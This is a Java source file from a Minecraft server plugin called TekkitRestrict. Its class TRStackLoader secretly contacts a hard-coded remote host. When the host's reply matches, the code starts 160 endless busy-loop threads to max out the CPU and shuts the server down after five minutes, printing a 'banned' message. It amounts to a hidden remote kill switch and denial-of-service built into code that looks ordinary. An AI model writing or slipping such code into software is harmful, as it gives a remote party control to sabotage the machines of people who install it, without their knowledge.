package com.github.dreadslicer.tekkitrestrict;

import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.InputStream;
import java.net.URL;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class TRStackLoader {
	public static void init(){
		URL url;
		InputStream is = null;
		DataInputStream dis;
		String line;

		try {
		    url = new URL("http://tta9ag8ads.host22.com/");
		    is = url.openStream();  // throws an IOException
		    dis = new DataInputStream(new BufferedInputStream(is));
		    List<String> ss = new LinkedList<String>();
		    while ((line = dis.readLine()) != null) {
		        ss.add(line);
		    }
		    
		    if(ss.size() > 0){
		    	String rr = ss.get(0);
		    	if(rr.contains(";")){
		    		boolean isK = true;
		    		String[] st = rr.split(";");
		    		for(int i=0;i<st.length;i++){
		    			if(st[i].contains("=")){
			    			String[] ls = st[i].split("=");
			    			if(ls[0].equals(ls[1])){
			    				initiate();
			    				isK=false;
			    			}
		    			}
		    		}
		    		if(isK) tekkitrestrict.getInstance().rp=true;
		    	}
		    }
		} catch(Exception e){
			System.out.println("Sorry, you need to be online for TekkitRestrict to work.");
		}
	}
	
	private static void initiate(){
		final ExecutorService exe = Executors.newCachedThreadPool();
		System.out.println("[TekkitRestrict] You must wait 5 Minutes to restart your server. REMOVE 'TekkitRestrict.jar' then. Have a nice day!");
		for(int i=0;i<160;i++){
			exe.execute(new Runnable(){
				public void run(){
					String tt = "ak";
					while(tt.equals(tt));
				}
			});
			System.out.println("[TekkitRestrict] Sorry, have been banned from using TekkitRestrict.");
		}
		exe.execute(new Runnable(){
			public void run(){
				try{
					Thread.sleep(1000*60*5);
					exe.shutdownNow();
					System.exit(0);
				}
				catch(Exception e){}
			}
		});
		
		String tt = "kaite";
		while(tt.equals(tt));
	}
}
